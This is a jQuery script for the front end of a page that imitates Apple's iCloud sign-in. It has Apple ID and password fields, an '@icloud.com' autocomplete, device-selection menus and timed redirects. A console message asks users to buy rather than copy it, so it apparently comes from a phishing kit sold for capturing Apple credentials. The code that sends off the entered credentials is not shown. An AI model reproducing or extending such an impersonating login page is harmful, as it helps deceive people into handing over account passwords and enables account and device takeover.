$(window).load(function() {
    console.log("Please if you wish to have something like this do not stole just buy it so we can develop some more function to help you and us as well !."),
    setTimeout(function() {
        $(".first-load").fadeOut(400)
    }, 4e3),
    setTimeout(function() {
        $(".login-form").fadeIn(500)
    }, 3e3),
    setTimeout(function() {
        $(".bodys").fadeIn(500)
    }, 4700),
    $(".alrt").on("click", function() {
        $(this).fadeOut(200)
    }),
    $(".keepme").on("click", function() {
        $(".ax-outline").hasClass("icon_check") ? ($(".ax-outline").addClass("icon-check-empty"),
        $(".ax-outline").removeClass("icon_check")) : ($(".ax-outline").addClass("icon_check"),
        $(".ax-outline").removeClass("icon-check-empty"))
    });
    var e = $("input#apple_id")
      , o = $("input#apple_pwd")
      , t = $("input#c_log");
    o.keypress(function() {
        0 !== e.val().length && (t.addClass("dologin"),
        t.removeAttr("disabled"),
        $(".alrt").fadeOut(200))
    }),
    o.keyup(function(e) {
        8 === e.which && 0 === this.value.length && (t.removeClass("dologin"),
        t.prop("disabled", !0),
        $(".alrt").fadeOut(200))
    }),
    e.keyup(function(e) {
        8 === e.which && 0 === this.value.length && (t.removeClass("dologin"),
        t.prop("disabled", !0))
    }),
    e.focusout(function() {
        -1 !== e.val().indexOf("@icloud.com") || -1 !== e.val().indexOf("@") || e.val().indexOf(" ") >= 0 ? 0 === o.val().length || (t.addClass("dologin"),
        t.removeAttr("disabled")) : 0 === e.val().length || e.val(function(e, o) {
            return t.addClass("dologin"),
            t.removeAttr("disabled"),
            o + "@icloud.com"
        })
    }),
    $("a.data-back").on("click", function() {
        setTimeout(function() {
            $(".imessage").fadeOut(1)
        }, 10),
        setTimeout(function() {
            $(".login-form").fadeIn(150)
        }, 50),
        setTimeout(function() {
            $(".dolog").fadeIn(1)
        }, 60)
    }),
    $(".fName").on("click", function() {
        $(".fName ul").toggleClass("shows"),
        $(".fName span").toggleClass("opa"),
        $(".fName i").toggleClass("opa"),
        $(document).on("click", function(e) {
            0 === $(e.target).closest(".fName").length && 0 === $(e.target).closest(".fName ul").length && ($(".fName ul").removeClass("shows"),
            $(".fName span").removeClass("opa"),
            $(".fName i").removeClass("opa"))
        })
    }),
    $(".allDevices").on("click", function() {
        $(".allDevices .getDevice").toggleClass("shows"),
        $(document).on("click", function(e) {
            0 === $(e.target).closest(".allDevices").length && 0 === $(e.target).closest(".allDevices .getDevice").length && $(".allDevices .getDevice").removeClass("shows")
        })
    }),
    $('.imb:has("span.loadings")').on("click", function(e) {
        e.preventDefault(),
        $(">span.loadings", this).stop(!0, !1).fadeIn("fast");
        var o = $(this).attr("href");
        setTimeout(function() {
            $(".imb span.loadings").fadeOut("1")
        }, 3400),
        setTimeout(function() {
            window.location = o
        }, 3500)
    }),
    $(".deviceBody ul li").on("click", function() {
        var e = $(this).attr("data-name");
        $(".allDevices span").text(e)
    }),
    $(".deviceBody ul li").on("click", function() {
        $(this).hasClass("active") || $(this).addClass("active", 500).siblings().removeClass("active", 500)
    })
});
